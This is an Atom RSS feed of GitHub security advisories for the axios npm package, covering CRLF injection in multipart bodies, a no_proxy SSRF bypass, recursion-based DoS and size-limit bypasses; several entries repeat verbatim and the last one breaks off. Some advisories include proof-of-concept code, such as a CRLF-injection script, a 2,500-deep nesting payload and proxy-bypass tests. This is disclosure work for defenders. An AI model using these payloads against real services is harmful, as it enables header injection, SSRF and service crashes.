<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-05-05T04:09:35.339Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: CRLF Injection in multipart/form-data body via unsanitized blob.type in formDataToStream]]></title>
        <id>https://github.com/advisories/GHSA-445q-vr5w-6q77</id>
        <link href="https://github.com/advisories/GHSA-445q-vr5w-6q77"/>
        <updated>2026-05-05T00:40:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>FormDataPart</code> constructor in <code>lib/helpers/formDataToStream.js</code> interpolates <code>value.type</code> directly into the <code>Content-Type</code> header of each multipart part without sanitizing CRLF (<code>\r\n</code>) sequences. An attacker who controls the <code>.type</code> property of a Blob/File-like object (e.g., via a user-uploaded file in a Node.js proxy service) can inject arbitrary MIME part headers into the multipart form-data body. This bypasses Node.js v18+ built-in header protections because the injection targets the multipart body structure, not HTTP request headers.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/helpers/formDataToStream.js</code> at line 27, when processing a Blob/File-like value, the code builds per-part headers by directly embedding value.type:</p>
<pre><code>if (isStringValue) {
  value = textEncoder.encode(String(value).replace(/\r?\n|\r\n?/g, CRLF));
} else {
  // value.type is NOT sanitized for CRLF sequences
  headers += `Content-Type: ${value.type || 'application/octet-stream'}${CRLF}`;
}
</code></pre>
<p>Note that the string path (line above) explicitly sanitizes CRLF, but the binary/blob path does not. This inconsistency confirms the sanitization was intended but missed for <code>value.type</code>.</p>
<h3 id="attack-chain">Attack chain:</h3>
<ol>
<li>Attacker uploads a file to a Node.js proxy service, supplying a crafted MIME type containing <code>\r\n</code> sequences</li>
<li>The proxy appends the file to a FormData and posts it via <code>axios.post(url, formData)</code></li>
<li>axios calls <code>formDataToStream()</code>, which passes <code>value.type</code> unsanitized into the multipart body</li>
<li>The downstream server receives a multipart body containing injected per-part headers</li>
<li>The server's multipart parser processes the injected headers as legitimate</li>
</ol>
<p>This is reachable via the fully public axios API (<code>axios.post(url, formData)</code>) with no special configuration.
Additionally, <code>value.name</code> used in the <code>Content-Disposition</code> construction nearby likely has the same issue and should be audited.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites</strong>: Node.js 18+, axios (tested on 1.14.0)</p>
<pre><code>const http = require('http');
const axios = require('axios');

let receivedBody = '';

const server = http.createServer((req, res) =&gt; {
  let body = '';
  req.on('data', chunk =&gt; { body += chunk.toString(); });
  req.on('end', () =&gt; {
    receivedBody = body;
    res.writeHead(200);
    res.end('ok');
  });
});

server.listen(0, '127.0.0.1', async () =&gt; {
  const port = server.address().port;

  class SpecFormData {
    constructor() {
      this._entries = [];
      this[Symbol.toStringTag] = 'FormData';
    }
    append(name, value) { this._entries.push([name, value]); }
    [Symbol.iterator]() { return this._entries[Symbol.iterator](); }
    entries() { return this._entries[Symbol.iterator](); }
  }

  const fd = new SpecFormData();

  fd.append('photo', {
    type: 'image/jpeg\r\nX-Injected-Header: PWNED-by-attacker\r\nX-Evil: arbitrary-value',
    size: 16,
    name: 'photo.jpg',
    [Symbol.asyncIterator]: async function*() {
      yield Buffer.from('MALICIOUS PAYLOAD');
    }
  });

  await axios.post(`http://127.0.0.1:${port}/upload`, fd);

  if (receivedBody.includes('X-Injected-Header: PWNED-by-attacker')) {
    console.log('[VULNERABLE] CRLF injection confirmed in multipart body');
    console.log('Received body:\n' + receivedBody);
  } else {
    console.log('[NOT_VULNERABLE]');
  }

  server.close();
});
</code></pre>
<h3 id="steps-to-reproduce">Steps to reproduce:</h3>
<ol>
<li>npm install axios</li>
<li>Save the above as poc_axios_crlf.js</li>
<li>Run node poc_axios_crlf.js</li>
<li>Observe the output shows [VULNERABLE] with injected headers visible in the multipart body</li>
</ol>
<p><strong>Expected behavior</strong>: value.type should be sanitized to strip \r\n before interpolation, consistent with the string value path.
<strong>Actual behavior</strong>: CRLF sequences in value.type are preserved, allowing arbitrary header injection in multipart parts.</p>
<h3 id="impact">Impact</h3>
<p>Any Node.js application that accepts user-provided files (with attacker-controlled MIME types) and re-posts them via axios FormData is affected. This is a common pattern in proxy services, file upload relays, and API gateways.
Consequences include: bypassing server-side Content-Type-based upload filters, confusing multipart parsers into misrouting data, injecting phantom form fields if the boundary is known, and exploiting downstream server vulnerabilities that trust per-part headers.
axios is one of the most downloaded npm packages, significantly increasing the blast radius of this issue.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>In formDataToStream.js, sanitize value.type before interpolating it into the per-part Content-Type header. Apply the same strategy used for string values (strip/replace \r\n) or use the same escapeName logic.</p>
<pre><code>const safeType = (value.type || 'application/octet-stream')
  .replace(/[\r\n]/g, '');
headers += `Content-Type: ${safeType}${CRLF}`;
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-445q-vr5w-6q77">https://github.com/axios/axios/security/advisories/GHSA-445q-vr5w-6q77</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42037">https://nvd.nist.gov/vuln/detail/CVE-2026-42037</a></li>
<li><a href="https://github.com/advisories/GHSA-445q-vr5w-6q77">https://github.com/advisories/GHSA-445q-vr5w-6q77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-445q-vr5w-6q77</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:40:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: no_proxy bypass via IP alias allows SSRF]]></title>
        <id>https://github.com/advisories/GHSA-m7pr-hjqh-92cm</id>
        <link href="https://github.com/advisories/GHSA-m7pr-hjqh-92cm"/>
        <updated>2026-05-05T00:40:18.000Z</updated>
        <content type="html"><![CDATA[<p>The fix for no_proxy hostname normalization bypass (#10661) is incomplete.When no_proxy=localhost is set, requests to 127.0.0.1 and [::1] still route through the proxy instead of bypassing it.</p>
<p>The shouldBypassProxy() function does pure string matching — it does not 
resolve IP aliases or loopback equivalents. As a result:</p>
<ul>
<li>no_proxy=localhost does NOT block 127.0.0.1 or [::1]</li>
<li>no_proxy=127.0.0.1 does NOT block localhost or [::1]</li>
</ul>
<p>POC :
process.env.no_proxy = 'localhost';
process.env.http_proxy = '<a href="http://attacker-proxy:8888">http://attacker-proxy:8888</a>';</p>
<pre><code class="language-(base)">    process.env.http_proxy = 'http://127.0.0.1:8888';

    console.log('=== Test 1: localhost (should bypass proxy) ===');
    try {
      await axios.get('http://localhost:7777/');
    } catch(e) {
      console.log('Error:', e.message);
    }

    console.log('');
    console.log('=== Test 2: 127.0.0.1 (should ALSO bypass proxy but DOES NOT) ===');
    try {
      await axios.get('http://127.0.0.1:7777/');
    } catch(e) {
      console.log('Error:', e.message);
    }

    fakeProxy.close();
    internalServer.close();
  });
});
EOF
=== Test 1: localhost (should bypass proxy) ===
✅ Internal server hit directly (correct)

=== Test 2: 127.0.0.1 (should ALSO bypass proxy but DOES NOT) ===
🚨 PROXY RECEIVED REQUEST TO: http://127.0.0.1:7777/
🚨 Host header: 127.0.0.1:7777. ```
 





&lt;img width="1212" height="247" alt="image" src="https://github.com/user-attachments/assets/0b07ddc4-507d-4b11-a630-15b94ad2c7e7" /&gt;




Impact: In server-side environments where no_proxy is used to prevent requests to internal/cloud metadata services (e.g., 169.254.169.254), an attacker who can influence the URL can bypass the restriction by using an IP alias instead of the hostname, routing the request through an attacker-controlled proxy and leaking internal data.

Fix: shouldBypassProxy() should resolve loopback aliases — localhost, 127.0.0.1, and ::1 should all be treated as equivalent.
### References

- &lt;https://github.com/axios/axios/security/advisories/GHSA-m7pr-hjqh-92cm&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-42038&gt;
- &lt;https://github.com/advisories/GHSA-m7pr-hjqh-92cm&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7pr-hjqh-92cm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:40:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: no_proxy bypass via IP alias allows SSRF]]></title>
        <id>https://github.com/advisories/GHSA-m7pr-hjqh-92cm</id>
        <link href="https://github.com/advisories/GHSA-m7pr-hjqh-92cm"/>
        <updated>2026-05-05T00:40:18.000Z</updated>
        <content type="html"><![CDATA[<p>The fix for no_proxy hostname normalization bypass (#10661) is incomplete.When no_proxy=localhost is set, requests to 127.0.0.1 and [::1] still route through the proxy instead of bypassing it.</p>
<p>The shouldBypassProxy() function does pure string matching — it does not 
resolve IP aliases or loopback equivalents. As a result:</p>
<ul>
<li>no_proxy=localhost does NOT block 127.0.0.1 or [::1]</li>
<li>no_proxy=127.0.0.1 does NOT block localhost or [::1]</li>
</ul>
<p>POC :
process.env.no_proxy = 'localhost';
process.env.http_proxy = '<a href="http://attacker-proxy:8888">http://attacker-proxy:8888</a>';</p>
<pre><code class="language-(base)">    process.env.http_proxy = 'http://127.0.0.1:8888';

    console.log('=== Test 1: localhost (should bypass proxy) ===');
    try {
      await axios.get('http://localhost:7777/');
    } catch(e) {
      console.log('Error:', e.message);
    }

    console.log('');
    console.log('=== Test 2: 127.0.0.1 (should ALSO bypass proxy but DOES NOT) ===');
    try {
      await axios.get('http://127.0.0.1:7777/');
    } catch(e) {
      console.log('Error:', e.message);
    }

    fakeProxy.close();
    internalServer.close();
  });
});
EOF
=== Test 1: localhost (should bypass proxy) ===
✅ Internal server hit directly (correct)

=== Test 2: 127.0.0.1 (should ALSO bypass proxy but DOES NOT) ===
🚨 PROXY RECEIVED REQUEST TO: http://127.0.0.1:7777/
🚨 Host header: 127.0.0.1:7777. ```
 





&lt;img width="1212" height="247" alt="image" src="https://github.com/user-attachments/assets/0b07ddc4-507d-4b11-a630-15b94ad2c7e7" /&gt;




Impact: In server-side environments where no_proxy is used to prevent requests to internal/cloud metadata services (e.g., 169.254.169.254), an attacker who can influence the URL can bypass the restriction by using an IP alias instead of the hostname, routing the request through an attacker-controlled proxy and leaking internal data.

Fix: shouldBypassProxy() should resolve loopback aliases — localhost, 127.0.0.1, and ::1 should all be treated as equivalent.
### References

- &lt;https://github.com/axios/axios/security/advisories/GHSA-m7pr-hjqh-92cm&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-42038&gt;
- &lt;https://github.com/advisories/GHSA-m7pr-hjqh-92cm&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7pr-hjqh-92cm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:40:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: unbounded recursion in toFormData causes DoS via deeply nested request data]]></title>
        <id>https://github.com/advisories/GHSA-62hf-57xw-28j9</id>
        <link href="https://github.com/advisories/GHSA-62hf-57xw-28j9"/>
        <updated>2026-05-05T00:34:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>toFormData recursively walks nested objects with no depth limit, so a deeply nested value passed as request data crashes the Node.js process with a RangeError.</p>
<h3 id="details">Details</h3>
<p>lib/helpers/toFormData.js:210 defines an inner <code>build(value, path)</code> that recurses into every object/array child (line 225: <code>build(el, path ? path.concat(key) : [key])</code>). The only safeguard is a <code>stack</code> array used to detect circular references; there is no maximum depth and no try/catch around the recursion. Because <code>build</code> calls itself once per nesting level, a payload nested roughly 2000+ levels deep exhausts V8's call stack.</p>
<p><code>toFormData</code> is the serializer behind <code>FormData</code> request bodies and <code>AxiosURLSearchParams</code> (used by <code>buildURL</code> when <code>params</code> is an object with <code>URLSearchParams</code> unavailable, see <code>lib/helpers/buildURL.js:53</code> and <code>lib/helpers/AxiosURLSearchParams.js:36</code>). Any server-side code that forwards a client-supplied object into <code>axios({ data, params })</code> therefore reaches the recursive walker with attacker-controlled depth.</p>
<p>The RangeError is thrown synchronously from inside <code>forEach</code>, escapes <code>toFormData</code>, and propagates out of the axios request call. In typical Express/Fastify request handlers this terminates the running request; in synchronous startup paths or worker threads it can crash the whole process.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">import toFormData from 'axios/lib/helpers/toFormData.js';
import FormData from 'form-data';

function nest(depth) {
  let o = { leaf: 1 };
  for (let i = 0; i &lt; depth; i++) o = { a: o };
  return o;
}

try {
  toFormData(nest(2500), new FormData());
} catch (e) {
  console.log(e.name + ': ' + e.message);
}
// RangeError: Maximum call stack size exceeded
</code></pre>
<p>Server-side reachability example:</p>
<pre><code class="language-js">// vulnerable proxy pattern
app.post('/forward', async (req, res) =&gt; {
  await axios.post('https://upstream/api', req.body); // req.body user-controlled
  res.send('ok');
});
// attacker POST /forward with {"a":{"a":{"a":... 2500 deep ...}}}
// -&gt; toFormData build() overflows -&gt; request handler crashes
</code></pre>
<p>Verified on axios 1.15.0 (latest, 2026-04-10), Node.js 20, 3/3 PoC runs reproduce the RangeError at depth 2500.</p>
<h3 id="impact">Impact</h3>
<p>A remote, unauthenticated attacker who can influence an object passed to axios as request <code>data</code> or <code>params</code> triggers an uncaught RangeError inside the synchronous recursive walker. In server-side applications that proxy or re-send client JSON through axios this crashes the request handler and, in worker/cluster setups, the process. Fix by bounding recursion depth in <code>toFormData</code>'s <code>build</code> function (reject or throw on depths beyond a configurable limit, e.g. 100) or rewriting the walker iteratively.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-62hf-57xw-28j9">https://github.com/axios/axios/security/advisories/GHSA-62hf-57xw-28j9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42039">https://nvd.nist.gov/vuln/detail/CVE-2026-42039</a></li>
<li><a href="https://github.com/advisories/GHSA-62hf-57xw-28j9">https://github.com/advisories/GHSA-62hf-57xw-28j9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62hf-57xw-28j9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:34:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: unbounded recursion in toFormData causes DoS via deeply nested request data]]></title>
        <id>https://github.com/advisories/GHSA-62hf-57xw-28j9</id>
        <link href="https://github.com/advisories/GHSA-62hf-57xw-28j9"/>
        <updated>2026-05-05T00:34:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>toFormData recursively walks nested objects with no depth limit, so a deeply nested value passed as request data crashes the Node.js process with a RangeError.</p>
<h3 id="details">Details</h3>
<p>lib/helpers/toFormData.js:210 defines an inner <code>build(value, path)</code> that recurses into every object/array child (line 225: <code>build(el, path ? path.concat(key) : [key])</code>). The only safeguard is a <code>stack</code> array used to detect circular references; there is no maximum depth and no try/catch around the recursion. Because <code>build</code> calls itself once per nesting level, a payload nested roughly 2000+ levels deep exhausts V8's call stack.</p>
<p><code>toFormData</code> is the serializer behind <code>FormData</code> request bodies and <code>AxiosURLSearchParams</code> (used by <code>buildURL</code> when <code>params</code> is an object with <code>URLSearchParams</code> unavailable, see <code>lib/helpers/buildURL.js:53</code> and <code>lib/helpers/AxiosURLSearchParams.js:36</code>). Any server-side code that forwards a client-supplied object into <code>axios({ data, params })</code> therefore reaches the recursive walker with attacker-controlled depth.</p>
<p>The RangeError is thrown synchronously from inside <code>forEach</code>, escapes <code>toFormData</code>, and propagates out of the axios request call. In typical Express/Fastify request handlers this terminates the running request; in synchronous startup paths or worker threads it can crash the whole process.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">import toFormData from 'axios/lib/helpers/toFormData.js';
import FormData from 'form-data';

function nest(depth) {
  let o = { leaf: 1 };
  for (let i = 0; i &lt; depth; i++) o = { a: o };
  return o;
}

try {
  toFormData(nest(2500), new FormData());
} catch (e) {
  console.log(e.name + ': ' + e.message);
}
// RangeError: Maximum call stack size exceeded
</code></pre>
<p>Server-side reachability example:</p>
<pre><code class="language-js">// vulnerable proxy pattern
app.post('/forward', async (req, res) =&gt; {
  await axios.post('https://upstream/api', req.body); // req.body user-controlled
  res.send('ok');
});
// attacker POST /forward with {"a":{"a":{"a":... 2500 deep ...}}}
// -&gt; toFormData build() overflows -&gt; request handler crashes
</code></pre>
<p>Verified on axios 1.15.0 (latest, 2026-04-10), Node.js 20, 3/3 PoC runs reproduce the RangeError at depth 2500.</p>
<h3 id="impact">Impact</h3>
<p>A remote, unauthenticated attacker who can influence an object passed to axios as request <code>data</code> or <code>params</code> triggers an uncaught RangeError inside the synchronous recursive walker. In server-side applications that proxy or re-send client JSON through axios this crashes the request handler and, in worker/cluster setups, the process. Fix by bounding recursion depth in <code>toFormData</code>'s <code>build</code> function (reject or throw on depths beyond a configurable limit, e.g. 100) or rewriting the walker iteratively.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-62hf-57xw-28j9">https://github.com/axios/axios/security/advisories/GHSA-62hf-57xw-28j9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42039">https://nvd.nist.gov/vuln/detail/CVE-2026-42039</a></li>
<li><a href="https://github.com/advisories/GHSA-62hf-57xw-28j9">https://github.com/advisories/GHSA-62hf-57xw-28j9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62hf-57xw-28j9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:34:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios' HTTP adapter-streamed uploads bypass maxBodyLength when maxRedirects: 0]]></title>
        <id>https://github.com/advisories/GHSA-5c9x-8gcm-mpgx</id>
        <link href="https://github.com/advisories/GHSA-5c9x-8gcm-mpgx"/>
        <updated>2026-05-05T00:33:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>For stream request bodies, maxBodyLength is bypassed when maxRedirects is set to 0 (native http/https transport path). Oversized streamed uploads are sent fully even when the caller sets strict body limits.</p>
<h3 id="details">Details</h3>
<p>Relevant flow in lib/adapters/http.js:</p>
<ul>
<li>556-564: maxBodyLength check applies only to buffered/non-stream data.</li>
<li>681-682: maxRedirects === 0 selects native http/https transport.</li>
<li>694-699: options.maxBodyLength is set, but native transport does not enforce it.</li>
<li>925-945: stream is piped directly to socket (data.pipe(req)) with no Axios byte counting.</li>
</ul>
<p>This creates a path-specific bypass for streamed uploads.</p>
<h3 id="poc">PoC</h3>
<p>Environment:</p>
<ul>
<li>Axios main at commit f7a4ee2</li>
<li>Node v24.2.0</li>
</ul>
<p>  Steps:</p>
<ol>
<li>Start an HTTP server that counts uploaded bytes and returns {received}.</li>
<li>Send a 2 MiB Readable stream with:<ul>
<li>adapter: 'http'</li>
<li>maxBodyLength: 1024</li>
<li>maxRedirects: 0</li>
</ul>
</li>
</ol>
<p>  Observed:</p>
<ul>
<li>Request succeeds; server reports received: 2097152.</li>
</ul>
<p>  Control checks:</p>
<ul>
<li>Same stream with default/nonzero redirects: rejected with ERR_FR_MAX_BODY_LENGTH_EXCEEDED.</li>
<li>Buffered body with maxRedirects: 0: rejected with ERR_BAD_REQUEST.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Type: DoS / uncontrolled upstream upload / resource exhaustion.
Impacted: Node.js services using streamed request bodies with maxBodyLength expecting hard enforcement, especially when following Axios guidance to use maxRedirects: 0 for streams.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-5c9x-8gcm-mpgx">https://github.com/axios/axios/security/advisories/GHSA-5c9x-8gcm-mpgx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42034">https://nvd.nist.gov/vuln/detail/CVE-2026-42034</a></li>
<li><a href="https://github.com/advisories/GHSA-5c9x-8gcm-mpgx">https://github.com/advisories/GHSA-5c9x-8gcm-mpgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5c9x-8gcm-mpgx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:33:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios' HTTP adapter-streamed uploads bypass maxBodyLength when maxRedirects: 0]]></title>
        <id>https://github.com/advisories/GHSA-5c9x-8gcm-mpgx</id>
        <link href="https://github.com/advisories/GHSA-5c9x-8gcm-mpgx"/>
        <updated>2026-05-05T00:33:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>For stream request bodies, maxBodyLength is bypassed when maxRedirects is set to 0 (native http/https transport path). Oversized streamed uploads are sent fully even when the caller sets strict body limits.</p>
<h3 id="details">Details</h3>
<p>Relevant flow in lib/adapters/http.js:</p>
<ul>
<li>556-564: maxBodyLength check applies only to buffered/non-stream data.</li>
<li>681-682: maxRedirects === 0 selects native http/https transport.</li>
<li>694-699: options.maxBodyLength is set, but native transport does not enforce it.</li>
<li>925-945: stream is piped directly to socket (data.pipe(req)) with no Axios byte counting.</li>
</ul>
<p>This creates a path-specific bypass for streamed uploads.</p>
<h3 id="poc">PoC</h3>
<p>Environment:</p>
<ul>
<li>Axios main at commit f7a4ee2</li>
<li>Node v24.2.0</li>
</ul>
<p>  Steps:</p>
<ol>
<li>Start an HTTP server that counts uploaded bytes and returns {received}.</li>
<li>Send a 2 MiB Readable stream with:<ul>
<li>adapter: 'http'</li>
<li>maxBodyLength: 1024</li>
<li>maxRedirects: 0</li>
</ul>
</li>
</ol>
<p>  Observed:</p>
<ul>
<li>Request succeeds; server reports received: 2097152.</li>
</ul>
<p>  Control checks:</p>
<ul>
<li>Same stream with default/nonzero redirects: rejected with ERR_FR_MAX_BODY_LENGTH_EXCEEDED.</li>
<li>Buffered body with maxRedirects: 0: rejected with ERR_BAD_REQUEST.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Type: DoS / uncontrolled upstream upload / resource exhaustion.
Impacted: Node.js services using streamed request bodies with maxBodyLength expecting hard enforcement, especially when following Axios guidance to use maxRedirects: 0 for streams.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-5c9x-8gcm-mpgx">https://github.com/axios/axios/security/advisories/GHSA-5c9x-8gcm-mpgx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42034">https://nvd.nist.gov/vuln/detail/CVE-2026-42034</a></li>
<li><a href="https://github.com/advisories/GHSA-5c9x-8gcm-mpgx">https://github.com/advisories/GHSA-5c9x-8gcm-mpgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5c9x-8gcm-mpgx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:33:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: HTTP adapter streamed responses bypass maxContentLength]]></title>
        <id>https://github.com/advisories/GHSA-vf2m-468p-8v99</id>
        <link href="https://github.com/advisories/GHSA-vf2m-468p-8v99"/>
        <updated>2026-05-05T00:26:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When responseType: 'stream' is used, Axios returns the response stream without enforcing maxContentLength. This bypasses configured response-size limits and allows unbounded downstream consumption.</p>
<h3 id="details">Details</h3>
<p>In lib/adapters/http.js:</p>
<ul>
<li>786-789: for responseType === 'stream', Axios immediately settles with the stream.</li>
<li>797-810: maxContentLength enforcement exists only in the non-stream buffering branch.</li>
</ul>
<p>So callers may set maxContentLength and still receive/read arbitrarily large streamed responses.</p>
<h3 id="poc">PoC</h3>
<p>Environment:</p>
<ul>
<li>Axios main at commit f7a4ee2</li>
<li>Node v24.2.0</li>
</ul>
<p> Steps:</p>
<ol>
<li>Start an HTTP server that returns a 2 MiB response body.</li>
<li>Call Axios with:<ul>
<li>adapter: 'http'</li>
<li>responseType: 'stream'</li>
<li>maxContentLength: 1024</li>
</ul>
</li>
<li>Read the returned stream fully.</li>
</ol>
<p>Observed:</p>
<ul>
<li>Success; full 2097152 bytes readable.</li>
</ul>
<p>Control check:</p>
<ul>
<li>Same endpoint with responseType: 'text' and same maxContentLength: rejected with maxContentLength size of 1024 exceeded.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Type: DoS / unbounded response processing.
Impacted: Node.js applications relying on maxContentLength as a safety boundary while using streamed Axios responses.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-vf2m-468p-8v99">https://github.com/axios/axios/security/advisories/GHSA-vf2m-468p-8v99</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42036">https://nvd.nist.gov/vuln/detail/CVE-2026-42036</a></li>
<li><a href="https://github.com/advisories/GHSA-vf2m-468p-8v99">https://github.com/advisories/GHSA-vf2m-468p-8v99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vf2m-468p-8v99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:26:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: HTTP adapter streamed responses bypass maxContentLength]]></title>
        <id>https://github.com/advisories/GHSA-vf2m-468p-8v99</id>
        <link href="https://github.com/advisories/GHSA-vf2m-468p-8v99"/>
        <updated>2026-05-05T00:26:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When responseType: 'stream' is used, Axios returns the response stream without enforcing maxContentLength. This bypasses configured response-size limits and allows unbounded downstream consumption.</p>
<h3 id="details">Details</h3>
<p>In lib/adapters/http.js:</p>
<ul>
<li>786-789: for responseType === 'stream', Axios immediately settles with the stream.</li>
<li>797-810: maxContentLength enforcement exists only in the non-stream buffering branch.</li>
</ul>
<p>So callers may set maxContentLength and still receive/read arbitrarily large streamed responses.</p>
<h3 id="poc">PoC</h3>
<p>Environment:</p>
<ul>
<li>Axios main at commit f7a4ee2</li>
<li>Node v24.2.0</li>
</ul>
<p> Steps:</p>
<ol>
<li>Start an HTTP server that returns a 2 MiB response body.</li>
<li>Call Axios with:<ul>
<li>adapter: 'http'</li>
<li>responseType: 'stream'</li>
<li>maxContentLength: 1024</li>
</ul>
</li>
<li>Read the returned stream fully.</li>
</ol>
<p>Observed:</p>
<ul>
<li>Success; full 2097152 bytes readable.</li>
</ul>
<p>Control check:</p>
<ul>
<li>Same endpoint with responseType: 'text' and same maxContentLength: rejected with maxContentLength size of 1024 exceeded.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Type: DoS / unbounded response processing.
Impacted: Node.js applications relying on maxContentLength as a safety boundary while using streamed Axios responses.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-vf2m-468p-8v99">https://github.com/axios/axios/security/advisories/GHSA-vf2m-468p-8v99</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42036">https://nvd.nist.gov/vuln/detail/CVE-2026-42036</a></li>
<li><a href="https://github.com/advisories/GHSA-vf2m-468p-8v99">https://github.com/advisories/GHSA-vf2m-468p-8v99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vf2m-468p-8v99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:26:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Prototype Pollution Gadgets - Response Tampering, Data Exfiltration, and Request Hijacking]]></title>
        <id>https://github.com/advisories/GHSA-pf86-5x62-jrwf</id>
        <link href="https://github.com/advisories/GHSA-pf86-5x62-jrwf"/>
        <updated>2026-05-05T00:26:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When <code>Object.prototype</code> has been polluted by any co-dependency with keys that axios reads without a <code>hasOwnProperty</code> guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process -- lodash &lt; 4.17.21, or any of several other common npm packages with known PP vectors. The two gadgets confirmed here work independently.</p>
<hr>
<h2 id="background-how-mergeconfig-builds-the-config-object">Background: how mergeConfig builds the config object</h2>
<p>Every axios request goes through <code>Axios._request</code> in <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L76"><code>lib/core/Axios.js#L76</code></a>:</p>
<pre><code class="language-js">config = mergeConfig(this.defaults, config);
</code></pre>
<p>Inside <code>mergeConfig</code>, the merged config is built as a plain <code>{}</code> object (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L20"><code>lib/core/mergeConfig.js#L20</code></a>):</p>
<pre><code class="language-js">const config = {};
</code></pre>
